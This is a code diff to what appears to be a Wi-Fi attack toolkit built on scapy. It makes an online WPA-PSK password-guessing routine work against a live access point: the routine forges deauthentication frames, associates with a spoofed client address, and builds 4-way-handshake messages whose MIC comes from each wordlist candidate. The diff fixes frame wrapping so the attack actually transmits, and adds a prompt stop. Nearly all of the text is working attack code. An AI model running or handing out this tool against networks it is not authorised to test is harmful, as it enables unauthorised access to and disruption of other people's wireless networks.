@@ -32,6 +32,7 @@ from __future__ import annotations
 import os
 import time
 from dataclasses import dataclass
+from functools import partial
 
 from scapy.layers.dot11 import (
     Dot11,
@@ -42,6 +43,7 @@ from scapy.layers.dot11 import (
     RadioTap,
 )
 from scapy.layers.eap import EAPOL, EAPOL_KEY
+from scapy.layers.l2 import LLC, SNAP
 from scapy.packet import Packet
 from scapy.sendrecv import AsyncSniffer, sendp
 
@@ -77,7 +79,23 @@ def _craft_client_deauth(bssid: str, client: str, reason: int = 3) -> Packet:
     return _inject_radiotap() / dot11 / Dot11Deauth(reason=reason)
 
 
-def _wait_for_dot11(iface: str, bssid: str, layer, timeout: float, send_fn=None):
+def _sniff_wait(sniffer, found: list, timeout: float, stop_event) -> None:
+    """Join the sniffer in short slices so a set stop_event aborts the
+    wait within ~0.2s instead of only when the full timeout expires --
+    this is what makes the GUI's Stop Attack button a real stop for an
+    online-guess attempt blocked in one of these waits (a single
+    sniffer.join(timeout) would otherwise sit out the whole timeout)."""
+    deadline = time.monotonic() + timeout
+    while not found:
+        if stop_event is not None and stop_event.is_set():
+            return
+        remaining = deadline - time.monotonic()
+        if remaining <= 0:
+            return
+        sniffer.join(timeout=min(0.2, remaining))
+
+
+def _wait_for_dot11(iface: str, bssid: str, layer, timeout: float, send_fn=None, stop_event=None):
     """Sniff for the next frame of `layer` genuinely sourced from bssid."""
     bssid_lower = bssid.lower()
     found = []
@@ -94,8 +112,8 @@ def _wait_for_dot11(iface: str, bssid: str, layer, timeout: float, send_fn=None)
         if send_fn is not None:
             time.sleep(0.05)
             send_fn()
+        _sniff_wait(sniffer, found, timeout, stop_event)
     finally:
-        sniffer.join(timeout=timeout)
         try:
             sniffer.stop()
         except Exception:  # noqa: BLE001, S110 - already stopped if stop_filter fired
@@ -103,11 +121,12 @@ def _wait_for_dot11(iface: str, bssid: str, layer, timeout: float, send_fn=None)
     return found[0] if found else None
 
 
-def _associate(iface: str, bssid: str, client: str, ssid: str, timeout: float) -> tuple[bool, str]:
+def _associate(iface: str, bssid: str, client: str, ssid: str, timeout: float, stop_event=None) -> tuple[bool, str]:
     """Open-system auth + real WPA-PSK association (RSN IE, not the WPS
     vendor IE attacks/wps.py uses). Returns (ok, detail)."""
     auth_resp = _wait_for_dot11(
-        iface, bssid, Dot11Auth, timeout, send_fn=lambda: sendp(craft_auth(bssid, client), iface=iface, verbose=False)
+        iface, bssid, Dot11Auth, timeout, stop_event=stop_event,
+        send_fn=lambda: sendp(craft_auth(bssid, client), iface=iface, verbose=False),
     )
     if auth_resp is None:
         return False, "no auth response"
@@ -117,7 +136,7 @@ def _associate(iface: str, bssid: str, client: str, ssid: str, timeout: float) -
 
     rsn_ie = craft_rsn_ie(akms=[2])  # PSK
     assoc_resp = _wait_for_dot11(
-        iface, bssid, Dot11AssoResp, timeout,
+        iface, bssid, Dot11AssoResp, timeout, stop_event=stop_event,
         send_fn=lambda: sendp(craft_assoc_req(bssid, client, ssid=ssid, extra_ies=[rsn_ie]), iface=iface, verbose=False),
     )
     if assoc_resp is None:
@@ -128,7 +147,7 @@ def _associate(iface: str, bssid: str, client: str, ssid: str, timeout: float) -
     return True, "associated"
 
 
-def _wait_for_m1(iface: str, bssid: str, timeout: float):
+def _wait_for_m1(iface: str, bssid: str, timeout: float, stop_event=None):
     """Sniff for the AP's EAPOL-Key Message 1 (ack set, mic not set)."""
     bssid_lower = bssid.lower()
     found = []
@@ -144,7 +163,7 @@ def _wait_for_m1(iface: str, bssid: str, timeout: float):
 
     sniffer = AsyncSniffer(iface=iface, prn=handler, stop_filter=lambda p: bool(found), store=False)
     sniffer.start()
-    sniffer.join(timeout=timeout)
+    _sniff_wait(sniffer, found, timeout, stop_event)
     try:
         sniffer.stop()
     except Exception:  # noqa: BLE001, S110 - already stopped if stop_filter fired
@@ -152,7 +171,7 @@ def _wait_for_m1(iface: str, bssid: str, timeout: float):
     return found[0] if found else None
 
 
-def _wait_for_m3_or_reject(iface: str, bssid: str, timeout: float, send_fn):
+def _wait_for_m3_or_reject(iface: str, bssid: str, timeout: float, send_fn, stop_event=None):
     """Wait for either an EAPOL-Key Message 3 (mic+ack+install -- success)
     or an explicit Deauth/Disassoc (unambiguous wrong-password signal).
     Returns ('m3', pkt) | ('rejected', pkt) | (None, None) on timeout."""
@@ -174,8 +193,8 @@ def _wait_for_m3_or_reject(iface: str, bssid: str, timeout: float, send_fn):
     try:
         time.sleep(0.05)
         send_fn()
+        _sniff_wait(sniffer, found, timeout, stop_event)
     finally:
-        sniffer.join(timeout=timeout)
         try:
             sniffer.stop()
         except Exception:  # noqa: BLE001, S110 - already stopped if stop_filter fired
@@ -186,7 +205,15 @@ def _wait_for_m3_or_reject(iface: str, bssid: str, timeout: float, send_fn):
 
 
 def _build_m2(bssid: str, client: str, replay_counter: int, descriptor_version: int, snonce: bytes, kck: bytes, rsn_ie_bytes: bytes) -> Packet:
-    """Build a real EAPOL-Key Message 2 (SNonce + station's RSNE + MIC)."""
+    """Build a real EAPOL-Key Message 2 (SNonce + station's RSNE + MIC),
+    wrapped in the full 802.11 Data/LLC/SNAP stack (station -> AP, ToDS).
+
+    The wrap is load-bearing, not cosmetic: this packet is sendp()'d onto
+    a monitor-mode AF_PACKET socket, where the kernel/driver expects the
+    bytes to begin with an 802.11 MAC header. A bare EAPOL frame (this
+    function's original return value) gets misparsed as one and never
+    transmits -- invisible to the unit tests, which inject try_fn and
+    never touch the wire."""
     key = EAPOL_KEY(
         key_descriptor_type=RSN_DESCRIPTOR_TYPE,
         key_type=1,  # Pairwise
@@ -205,19 +232,33 @@ def _build_m2(bssid: str, client: str, replay_counter: int, descriptor_version: 
     unsigned = bytes(eapol)
     mic = compute_mic(kck, unsigned)
     key.key_mic = mic
-    return EAPOL(version=1, type=3) / key
+    dot11 = Dot11(type=2, subtype=0, FCfield="to_DS", addr1=bssid, addr2=client, addr3=bssid)
+    return (
+        _inject_radiotap()
+        / dot11
+        / LLC(dsap=0xAA, ssap=0xAA, ctrl=3)
+        / SNAP(OUI=0, code=0x888E)
+        / EAPOL(version=1, type=3)
+        / key
+    )
 
 
 def _try_password(
     iface: str, bssid: str, client: str, ssid: str, password: str, msg_timeout: float,
+    stop_event=None,
 ) -> tuple[bool, str]:
     """One full live attempt: associate, 4-way handshake with `password`
-    as the candidate PSK. Returns (success, detail)."""
-    ok, detail = _associate(iface, bssid, client, ssid, msg_timeout)
+    as the candidate PSK. Returns (success, detail). A set stop_event
+    aborts whichever phase is in progress within ~0.2s (see _sniff_wait)
+    instead of sitting out each sniffer's full timeout."""
+    ok, detail = _associate(iface, bssid, client, ssid, msg_timeout, stop_event=stop_event)
     if not ok:
         return False, f"assoc: {detail}"
+    if stop_event is not None and stop_event.is_set():
+        sendp(_craft_client_deauth(bssid, client), iface=iface, verbose=False)
+        return False, "stopped"
 
-    m1 = _wait_for_m1(iface, bssid, msg_timeout)
+    m1 = _wait_for_m1(iface, bssid, msg_timeout, stop_event=stop_event)
     if m1 is None:
         sendp(_craft_client_deauth(bssid, client), iface=iface, verbose=False)
         return False, "no Message 1 from AP after association"
@@ -245,6 +286,7 @@ def _try_password(
             _build_m2(bssid, client, replay_counter, descriptor_version, snonce, kck, rsn_ie_bytes),
             iface=iface, verbose=False,
         ),
+        stop_event=stop_event,
     )
     sendp(_craft_client_deauth(bssid, client), iface=iface, verbose=False)
 
@@ -267,7 +309,7 @@ def online_guess(
     max_consecutive_assoc_failures: int = 3,
     stop_event=None,
     progress_fn=None,
-    try_fn=_try_password,
+    try_fn=None,
 ) -> OnlineGuessResult:
     """Walk `wordlist` (one candidate per line), trying each as a live PSK
     against bssid/ssid. Stops at the first AP-confirmed success, the
@@ -278,14 +320,18 @@ def online_guess(
     excluding/blacklisting this client, not a per-password result worth
     continuing to burn attempts against.
 
-    `try_fn` is dependency-injected (defaults to the real _try_password)
-    so the wordlist/budget/stop-event orchestration here can be unit
-    tested without touching hardware, matching this project's existing
-    pattern (see e.g. omni.py's own docstring, wps_pin_bruteforce's
-    attempt_fn)."""
+    `try_fn` is dependency-injected (defaults to the real _try_password
+    with stop_event bound in, so the GUI's Stop Attack aborts an attempt
+    mid-handshake, not just between attempts) so the wordlist/budget/
+    stop-event orchestration here can be unit tested without touching
+    hardware, matching this project's existing pattern (see e.g. omni.py's
+    own docstring, wps_pin_bruteforce's attempt_fn)."""
     def log(msg: str) -> None:
         if progress_fn is not None:
             progress_fn(msg)
+
+    if try_fn is None:
+        try_fn = partial(_try_password, stop_event=stop_event)
 
     if ensure_channel(iface, channel):
         log(f"channel set to {channel}")
